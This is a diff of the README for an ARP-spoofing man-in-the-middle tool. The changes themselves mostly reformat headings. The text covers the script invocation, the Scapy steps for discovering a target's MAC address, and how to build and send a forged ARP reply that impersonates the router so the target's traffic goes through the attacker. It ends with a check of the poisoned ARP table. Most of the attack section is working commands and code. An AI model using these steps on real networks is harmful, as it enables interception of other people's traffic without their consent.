@@ -1,6 +1,6 @@
 # ArpSpoof-MITM-Framework
 
-    Script usage --> (attack on a network with 3 machines: router, attacker, target):
+## Script usage --> (attack on a network with 3 machines: router, attacker, target):
 
                 python3 arp-mitm.py {ROUTERIP} {TARGETIP}
 
@@ -20,7 +20,7 @@
             --> This will cause every outgoing packets from the target machine will be sent to both the router and the target
                 machine
     
-    Some useful Scapy commands:
+## Some useful Scapy commands:
 
         [-] ls(ARP) --> will list all fields required by an ARP packet
         
@@ -34,48 +34,47 @@
         
         [-] packet.op = 2 --> sending response
 
-    Methodology: 
+## Methodology: 
 
         [-] Send arp request through the broadcast MAC address, every machine on the LAN will receive 
             request and possibly send the reply
         
         [-] Impacket (manually):
             
-            Getting mac address of target machine w/ spoofed ARP request :
-            
+                Getting mac address of target machine w/ spoofed ARP request :
+
                 [-] broadcast = Ether(dst='ff:ff:ff:ff:ff:ff') --> Broadcast Address
-                
+
                 [-] arp_layer = ARP(pdst='{TARGETIP}')
-                
+
                 [-] entire_packet = broadcast/arp_layer --> combines arp_layer and broadcast layer into packet
-                
+
                 [-] answer = srp(entire_packet, timeout=2, verbose=True)[0] --> sending request to broadcast
-                
+
                 [-] print(answer) --> will show request and response if any received
-                
+
                 [-] print(answer[0])
-                
-                [-] target_mac_address = answer[0][1].hwsrc --> get mac address of target                                                                                                                                                                                                                                                                                  
-                
+
+                [-] target_mac_address = answer[0][1].hwsrc --> get mac address of target                                                                                                                                                                                                                              
                 [-] print(target_mac_address)
 
-            Craftinfg Malicious packet:
+### Craftinfg Malicious packet:
 
-                [-] We are essentially going to craft a packet that will tell the target machine that
+            [-] We are essentially going to craft a packet that will tell the target machine that
                     the attacker machine is a router, so it sends all of its packets to the attacker machine
                 
-                [-] packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.0.131', psrc='192.168.0.1')
+            [-] packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.0.131', psrc='192.168.0.1')
                     
                     --> psrc is address of machine we want to impersonate (router)
                     --> run `netstat -nr` in terminal to find addr of router on your network (gateway)
                 
-                [-] packet.show() will show the contents of our malicious packet
+            [-] packet.show() will show the contents of our malicious packet
                 
-                [-] send(packet, verbose=False) --> sends malicious packet to spoof targets ARP table
+            [-] send(packet, verbose=False) --> sends malicious packet to spoof targets ARP table
             
-            Arp-tables on target machine:
+### Arp-tables on target machine:
 
-                [-] You can run the command `arp -a` on the target machine before sending the malicious packet, 
+            [-] You can run the command `arp -a` on the target machine before sending the malicious packet, 
                     and again after sending the malicious packet to confirm if we successfully spoofed the arp
                     tables on the target machine
 
